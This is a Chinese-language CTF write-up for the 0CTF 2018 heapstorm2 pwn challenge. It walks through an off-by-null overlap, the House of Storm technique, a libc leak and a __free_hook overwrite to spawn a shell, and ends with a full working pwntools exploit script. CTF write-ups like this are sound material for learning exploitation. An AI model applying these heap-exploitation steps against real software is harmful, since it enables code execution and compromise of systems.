---
title: 0ctf_2018_heapstorm2
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- heap
- house_of_xxx
---
House of Storm例题
<!-- more -->
64位堆题，保护全开，libc 2.23。

一个菜单，有增删查改功能。

程序开始时会禁用，初始化heap_array。

```c
struct heapchunk
{
    unsigned long size ^ r1;
    unsigned long chunk ^ r2;
};

struct heaparray
{
    unsigned long r1,r2,r3,r4;//四个随机数，其中r3==r4
    struct heapchunk heap_chunk[16];
} heap_array;

```

add功能中最多同时存在16个chunk并且会使用calloc，对chunk中内容清空。

delete功能中会检测idx和size是否正确，free后会清空指针和size。

edit功能中存在off by one漏洞。写入数据大小必须**小于size-0x12**，并且会在写入的content后面加上一个12字节的字符串，同时会**多写一个'\x00'**。因此这里直接利用edit控制pre_size是不可行的。

show功能开始的时候会对heaparray的r3和r4进行xor，只有结果`==0x13377331`才能show，然而``r3==r4`，xor的结果会是0。这让我们能够**控制heaparray才能show**。

首先我们通过off by null减小size，再利用前向合并(unlink)来实现overlapping，控制两个chunk用于house of storm。

```python
add(0x18)#0
add(0x508)#1
add(0x18)#2

add(0x18)#3
add(0x508)#4
add(0x18)#5
add(0x18)#6


payload='a'*0x4f0+p64(0x500)
edit(1,payload)#首先在chunk1+0x4f0写入0x500，作为之后的pre_size
free(1)#释放chunk1，这会写入chunk2的pre_size(0x510)和pre_inuse(0)

payload='a'*(0x18-12)
edit(0,payload)#通过off by null修改chunk1的size(0x511=>0x500)

#这里将0x500的内容申请出来，chunk7后面用来overlapping
add(0x18)#1
add(0x4d8)#7

free(1)#绕过unlink的检查（合并的时候会用unlink去取chunk）
free(2)#释放chunk2后，由于pre_inuse==0会进行前向合并，根据pre_size(0x510)找到前一个chunk进行合并(合并了之前chunk1的0x510)
#由此实现overlapping，chunk7->heapbase+0x50，能写入0x4d8(实际上只要能控制前0x20即可)

add(0x38)#1
add(0x4e8)#2 overlapping，可以被chunk7控制，size为0x4f0

#故技重施
payload='a'*0x4f0+p64(0x500)
edit(4,payload)#在chunk4+0x4f0写入0x500，作为之后的pre_size
free(4)#释放chunk4，这会写入chunk5的pre_size(0x510)和pre_inuse(0)

payload='a'*(0x18-12)
edit(3,payload)#通过off by null修改chunk4的size(0x511=>0x500)

#这里将0x500的内容申请出来，chunk8后面用来overlapping
add(0x18)#4
add(0x4d8)#8 

free(4)#绕过unlink的检查（合并的时候会用unlink去取chunk）
free(5)#释放chunk5后，由于pre_inuse==0会进行前向合并，根据pre_size(0x510)找到前一个chunk进行合并(合并了之前chunk4的0x510)
#由此实现overlapping，chunk8->heapbase+0x5a0，能写入0x4d8

add(0x48)#4 从unsorted bin中切割，余下0x4e0大小的chunk(被chunk8控制)在unsorted bin中
free(2)#将chunk7控制的chunk(0x4f0)放入unsorted bin
add(0x4e8)#2 由于unsorted bin先进先出的机制，因此0x4e0的chunk首先被考虑，由于大小不足，被放入large bin。0x4f0的chunk由于大小恰好被分配出来。
free(2)#把chunk7控制的chunk(0x4f0)释放，放入unsorted bin

#至此，可以用chunk7控制一个unsorted bin chunk(0x4f0)，用chunk8控制一个large bin chunk(0x4e0)
#并且unsorted bin chunk size >large bin chunk size ,并且均在一个large bin范围内

#chunk7->unsorted bin chunk-0x10
#chunk8->large bin chunk-0x20
```

之后就可以进行House of Storm了，需要构造一下内容：

```c
unsorted_bin_chunk->bk=fake_chunk
large_bin_chunk->bk=fake_chunk+0x8
large_bin_chunk->bk_nextsize=fake_chunk-0x18-5
```

这里的fake chunk自然就是0x13370800-0x10。

```python
#修改unsorted bin chunk的bk,large bin chunk的bk和bk_nextsize
fake=0x13370800-0x10
payload=p64(0)*2+p64(0)+p64(0x4f1)+p64(0)+p64(fake)
edit(7,payload)#unsort bin chunk's bk
payload=p64(0)*4+p64(0)+p64(0x4e1)+p64(0)+p64(fake+0x8)+p64(0)+p64(fake-0x18-0x5)
edit(8,payload)#large bin chunk's bk and bk_nextsize

#如果运气好，堆地址的高位是0x56，则能绕过检测malloc成功
add(0x48)#2 malloc 0x13370800 House of Storm
```

申请到0x13370800之后，就可以修改r3和r4获得show来leak libcbase，之后也可以修改r1、r2和堆指针获得任意写。

因为malloc后才加密，而在malloc之后，仍会保存其fd和bk（不知道为什么没有被calloc清空），之后chunk_addr^fd再写入heaparray中。此时fd->unsorted bin，因此heaparray+0x40^chunk_addr可以得到fd，由此可以leak libcbase。

```python
#reset r1~r4 and leak libc
payload=p64(0)*3+p64(0x13377331)+p64(0x13370800)+p64(0x70)#reset chunk0=>heaparray
edit(2,payload)#get show

show(0)

ru("]: ")
ru('HEAPSTORM_II')
libcbase=(uu64(ru('\x7f')[-6:])^0x13370800)-0x68-0x3c4b10
leak('libcbase',hex(libcbase))
```

最后修改__free_hook为system函数，执行system("/bin/sh\x00")。

总的exp:

```python
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='./pwn'
elf=ELF(filename)
libc=ELF('./libc-2.23.so')
p=process(filename)
#p=remote()

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()

def add(size):
  ru('Command: ')
  sl('1')
  ru('Size: ')
  sl(str(size))

def edit(idx,content):
  ru('Command: ')
  sl('2')
  ru('Index: ')
  sl(str(idx))
  ru('Size: ')
  sl(str(len(payload)))
  ru('Content: ')
  s(str(content))

def free(idx):
  ru('Command: ')
  sl('3')
  ru('Index: ')
  sl(str(idx))

def show(idx):
  ru('Command: ')
  sl('4')
  ru('Index: ')
  sl(str(idx))

add(0x18)#0
add(0x508)#1
add(0x18)#2
add(0x18)#3
add(0x508)#4
add(0x18)#5
add(0x18)#6

payload='a'*0x4f0+p64(0x500)
edit(1,payload)#edit the pre_size of fake chunk 
free(1)#reset the pre_inuse and pre_size of chunk2
#reset the size of chunk1 by null of byte
payload='a'*(0x18-12)
edit(0,payload)

#malloc 0x500
add(0x18)#1
add(0x4d8)#7

free(1)
free(2)#the pre_size of chunk2 is 0x510 ,pre_inuse is 0 so chunk 2 will merge with chunk1(chunk2-pre_size==chunk1)
#now we achieve chunk overlapping
#chunk7->heap_base+0x50 can control 0x4d8
#now we use malloc to get the chunk
add(0x38)#1
add(0x4e8)#2 can be control by chunk7(chunk7->chunk2-0x10)


#do again by chunk4
payload='a'*0x4f0+p64(0x500)
edit(4,payload)#edit the pre_size of fake chunk 
free(4)#reset the pre_inuse and pre_size of chunk2
payload='a'*(0x18-12)
edit(3,payload)
add(0x18)#4
add(0x4d8)#8
#chunk8->heap_base+0x5a0 can control 0x4d8
free(4)
free(5)

add(0x48)#4 make a smaller chunk
free(2)
add(0x4e8)#2 put the smaller chunk into large bin(size=0x4e1) control by chunk8
free(2)#put the bigger chunk into unsorted bin(size=0x4f1) controlled by chunk7

#reset the bk of unsorted bin chunk, bk and bk_nextsize of large bin chunk
fake=0x13370800-0x10
payload=p64(0)*2+p64(0)+p64(0x4f1)+p64(0)+p64(fake)
edit(7,payload)#unsort bin chunk's bk
payload=p64(0)*4+p64(0)+p64(0x4e1)+p64(0)+p64(fake+0x8)+p64(0)+p64(fake-0x18-0x5)
edit(8,payload)#large bin chunk's bk and bk_nextsize
add(0x48)#2 malloc 0x13370800

#reset r1~r4 and leak libc
payload=p64(0)*3+p64(0x13377331)+p64(0x13370800)+p64(0x70)#reset chunk0=>heaparray
edit(2,payload)#get show

show(0)

ru("]: ")
ru('HEAPSTORM_II')
libcbase=(uu64(ru('\x7f')[-6:])^0x13370800)-0x68-0x3c4b10
leak('libcbase',hex(libcbase))

#overwrite free_hook to get shell
free_hook=libcbase+libc.sym['__free_hook']
sys_addr=libcbase+libc.sym ['system']
leak("free_hook",hex(free_hook))
leak("system",hex(sys_addr))

payload=p64(0)*3+p64(0x13377331)+p64(0x13370800)+p64(0x70)+p64(free_hook)+p64(0x50)+p64(0x13370850)+p64(0x50)+"/bin/sh\x00"
#reset chunk1=>free_hook chunk2=>"/bin/sh"
edit(0,payload)
#debug()
payload=p64(sys_addr)
edit(1,payload)

free(2)

itr()
```
